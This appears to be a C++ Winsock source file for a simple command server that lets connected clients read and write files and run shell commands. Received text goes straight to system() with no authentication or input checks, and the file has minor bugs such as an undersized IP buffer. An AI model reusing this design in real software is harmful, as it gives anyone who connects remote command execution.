#include "CommandServer.h"

void Client_Accept(Client_Data& Data)
{
    char recvbuf[COMMAND_BUFLEN];
    int recvbuflen = COMMAND_BUFLEN;

    recvbuf[0] = Data.reason;
    send(Data.ClientSocket, recvbuf, HEADER_SIZE, 0);//send accept code
    Data.status = true;

    // Receive until the peer shuts down the connection
    int iResult = 1;
    while (iResult > 0)
    {
        iResult = recv(Data.ClientSocket, recvbuf, recvbuflen, 0);

        switch (recvbuf[0])
        {
        case COMMAND_READ:
            std::cout << "\nSending file \"" << recvbuf + sizeof(char) * HEADER_SIZE + sizeof(' ') << "\"";//DEBUG
            SendFile(Data.ClientSocket, recvbuf + sizeof(char) * HEADER_SIZE + sizeof(' '));
            break;

        case COMMAND_WRITE:
            std::cout << "\nRecieving a file";//DEBUG
            RecvFile(Data.ClientSocket);
            break;

        case COMMAND_CONSOLE:
            ExecuteCommandConsole(recvbuf);
            break;

        case COMMAND_EXIT:
            std::cout << "\n[+]EXIT Command Recieved!";
            shutdown(Data.ClientSocket, SD_BOTH);
            closesocket(Data.ClientSocket);
            Data.status = false;
            return;

        case COMMAND_SHUTDOWN:
            std::cout << "\n[+]SHUTDOWN Command Recieved!";
            Data.status = false;
            ShutDown(Data.ClientSocket);
        }
    }
    char ip[10];
    inet_ntop(Data.ClientAddr.sin_family, &Data.ClientAddr.sin_addr, ip, sizeof(ip));
    int port = htons(Data.ClientAddr.sin_port);
    std::cout << "\n[!]Connection unexpectedly closed by the client N." << Data.ThreadID 
        << "\nIP." << ip << ":" << port << "\n";
    closesocket(Data.ClientSocket);
    Data.status = false;
    return;
}


void Client_Decline(Client_Data& Data)
{
    char SendErrorCode[HEADER_SIZE];
    SendErrorCode[0] = Data.reason;

    send(Data.ClientSocket, SendErrorCode, HEADER_SIZE, 0);//send decline reason
    shutdown(Data.ClientSocket, SD_BOTH);
    closesocket(Data.ClientSocket);
    Data.status = false;
}


int ShutDown(SOCKET& ClientSocket)
{
    std::cout << "\n[+]SERVER SHUTDOWN\n";
    closesocket(ClientSocket);
    WSACleanup();
    ExitProcess(EXIT_SUCCESS);
}

int Server_Init(SOCKET& ListenSocket)
{
    WSADATA wsaData;
    int iResult;

    struct addrinfo* result = NULL;
    struct addrinfo hints;


    // Initialize Winsock
    iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
    if (iResult != 0)
    {
        printf("[!]WSAStartup Failed With Error: %d\n", iResult);
        return 1;
    }

    ZeroMemory(&hints, sizeof(hints));
    hints.ai_family = AF_INET;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_protocol = IPPROTO_TCP;
    hints.ai_flags = AI_PASSIVE;


    // Resolve the server address and port
    iResult = getaddrinfo(NULL, DEFAULT_PORT, &hints, &result);
    if (iResult != 0)
    {
        printf("[!]Getaddrinfo Failed With Error: %d\n", iResult);
        WSACleanup();
        return 1;
    }

    // Create a SOCKET for the server to listen for client connections.
    ListenSocket = socket(result->ai_family, result->ai_socktype, result->ai_protocol);
    if (ListenSocket == INVALID_SOCKET)
    {
        printf("[!]Socket Failed With Error: %ld\n", WSAGetLastError());
        freeaddrinfo(result);
        WSACleanup();
        return 1;
    }

    // Setup the TCP listening socket
    iResult = bind(ListenSocket, result->ai_addr, (int)result->ai_addrlen);
    if (iResult == SOCKET_ERROR)
    {
        printf("[!]Bind Failed With Error: %d\n", WSAGetLastError());
        freeaddrinfo(result);
        closesocket(ListenSocket);
        WSACleanup();
        return 1;
    }

    freeaddrinfo(result);

    iResult = listen(ListenSocket, SOMAXCONN);
    if (iResult == SOCKET_ERROR)
    {
        printf("[!]Listen Failed With Error: %d\n", WSAGetLastError());
        closesocket(ListenSocket);
        WSACleanup();
        return 1;
    }

    return 0;
}

int ExecuteCommandConsole(char* CommandBuf)
{
    std::cout << "\nSystem: " << CommandBuf + sizeof(char) * HEADER_SIZE << "\n";
    system(CommandBuf + sizeof(char) * HEADER_SIZE);
    return 0;
}